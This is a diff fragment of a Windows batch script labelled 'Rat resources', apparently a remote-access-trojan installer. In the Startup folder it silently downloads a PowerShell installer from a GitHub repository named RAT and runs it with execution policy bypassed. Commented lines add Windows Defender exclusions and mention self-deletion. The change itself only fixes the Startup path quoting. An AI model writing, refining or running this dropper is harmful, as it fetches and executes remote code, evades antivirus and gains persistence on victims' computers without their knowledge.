@@ -30,7 +30,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM Rat resources
-cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %STARTUP%
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; @REM Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -ep bypass ./Installer.ps1
 @REM self delete
